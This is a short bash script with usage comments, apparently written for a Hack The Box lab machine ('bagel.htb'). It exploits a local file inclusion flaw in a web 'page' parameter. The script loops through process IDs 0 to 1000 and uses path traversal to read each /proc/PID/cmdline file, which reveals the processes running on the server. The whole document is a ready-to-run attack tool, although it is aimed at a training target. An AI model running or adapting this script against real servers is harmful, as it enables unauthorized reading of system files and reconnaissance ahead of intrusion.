#!/bin/bash

for i in $(seq 0 1000);do
    echo -n "Trying $i... "
    curl -q -s bagel.htb:8000/?page=..//..//..//..//..//..//..//proc/$i/cmdline -o -
    echo
done
    echo "Done!"
exit 0

# ==============================================================================
# PROC LFI BRUTEFORCE SCRIPT
# ==============================================================================
# 
# PURPOSE:
#   Exploits Local File Inclusion (LFI) vulnerability to enumerate running 
#   processes on a target server by reading /proc/PID/cmdline files
#
# HOW IT WORKS:
#   - Uses path traversal (../) to escape web directory restrictions
#   - Reads /proc/PID/cmdline for each process ID from 0 to 1000
#   - cmdline shows the command used to start each process
#
# REQUIREMENTS:
#   - Target must have LFI vulnerability in 'page' parameter
#   - Target must be running Linux (uses /proc filesystem)
#   - curl must be installed
#
# USAGE:
#   ./proc-lfi-bruteforce.sh | tee process.log
#   Filtering the output: cat process.log | grep -a '/' > filtered-process.log
#
# OUTPUT:
#   - Shows process ID being tested
#   - Displays command line of running processes (if found)
#   - Empty lines indicate non-existent or inaccessible PIDs
#
